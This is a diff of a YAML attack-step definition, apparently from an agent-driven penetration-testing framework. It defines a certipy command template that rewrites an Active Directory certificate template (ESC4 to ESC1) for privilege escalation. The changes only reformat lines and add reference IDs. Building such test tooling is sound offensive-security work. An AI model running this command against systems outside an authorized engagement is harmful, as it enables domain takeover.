@@ -6,8 +6,7 @@ preconditions:
 - has_cred
 parameters:
   target_ip: from_engagement.target_ip
-command_template: certipy template -u '{username}@{domain}' -p '{password}' -template
-  '{template}' -save-old -dc-ip {target_ip}
+command_template: certipy template -u '{username}@{domain}' -p '{password}' -template '{template}' -save-old -dc-ip {target_ip}
 parser: generic_parser
 expected_effects:
 - template_modified
@@ -16,6 +15,16 @@ falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "ESC4: WriteDACL/Owner on template \u2192 modify template to ESC1 config\
-  \ (add CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, set SAN). Then exploit as ESC1."
+mechanism: "ESC4: WriteDACL/Owner on template \u2192 modify template to ESC1 config (add CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT,\
+  \ set SAN). Then exploit as ESC1."
 hacktricks_ref: windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
+references:
+  ocd_mindmap_node_ids:
+  - 07650d7a48
+  - 1fd23b0b69
+  - 49bb4c7c69
+  - 4a5b178911
+  - 61a3d002ab
+  - 8f48806198
+  - bab10c0ce0
+  - bd14897458
